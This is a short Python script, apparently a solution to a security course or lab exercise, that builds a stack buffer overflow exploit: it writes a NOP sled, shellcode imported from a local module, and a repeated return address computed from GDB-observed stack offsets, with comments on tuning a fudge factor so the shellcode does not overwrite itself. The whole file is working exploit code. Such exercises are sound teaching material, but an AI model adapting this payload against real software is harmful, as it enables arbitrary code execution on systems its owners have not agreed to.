#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
nop = b"\x90"

ebp = 0xfffeec58 + 0x110
buf_offset = 0x408 # From GDB 
buf = ebp - buf_offset

buf_guess = 0xfffeec58 - buf_offset # Usual EBP + offset
sled_size = buf_offset - len(shellcode) - 20 # -20 is fudge factor*

# * w/o fudge factor our stack pointer was in the middle of
# the shellcode, so the shellcode would overwrite itself with
# push instructions. ~20 was enough to stop this

# Make sure sled_size is divisble by 4
sled_size = 4 - (sled_size % 4) + sled_size

# Construct nop-sled with just enough space for shellcode at the end
sys.stdout.buffer.write(nop * (sled_size + 1)) # +1 b/c len(shellcode) % 4 = 3

# Write shellcode (in buf)
sys.stdout.buffer.write(shellcode)

# Write address of shellcode (buf)
sys.stdout.buffer.write(pack("<I", buf_guess+sled_size//2) * sled_size)

sys.stdout.buffer.flush()
